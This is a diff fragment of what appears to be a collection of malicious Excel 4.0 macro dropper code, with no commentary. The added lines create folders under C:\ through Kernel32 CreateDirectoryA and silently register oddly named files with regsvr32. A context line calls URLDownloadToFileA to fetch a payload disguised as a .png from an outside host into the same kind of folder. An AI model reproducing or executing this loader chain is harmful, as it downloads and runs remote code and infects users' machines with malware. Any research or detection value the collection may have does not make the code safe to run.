@@ -13,6 +13,19 @@
 
 ******************************
 
+=CALL("Kernel32", "CreateDirectoryA", "CJ", "C:\Yecgtrio\", 0)
+=CALL("Kernel32", "CreateDirectoryA", "CJ", "C:\Yecgtrio\Iaforsta\", 0)
+
+regsvr32 /s calc
+
+regsvr32 C:\Yecgtrio\Iaforsta\Bygenseb.OOOOCCCXXX
+
+regsvr32 C:\Yecgtrio\Iaforsta\BygenseA.OOOOCCCXXX
+
+regsvr32 C:\Yecgtrio\Iaforsta\Bygenseb.OOOOCCCXXX
+
+******************************
+
 =CALL("Kernel32", "CreateDirectoryA", "CJ", "C:\Nychtria", 0)
 =CALL("Kernel32", "CreateDirectoryA", "CJ", "C:\Nychtria\Byfosrta", 0)
 =CALL("uRlMon", "URLDownloadToFileA", "JCCB", 0, "HTTPS://sahlonline.com/0f6eAzyWLUL/Lkmn.png", "C:\Nychtria\Byfosrta\Nyfense.OOOOOCCCCCXXXXX")
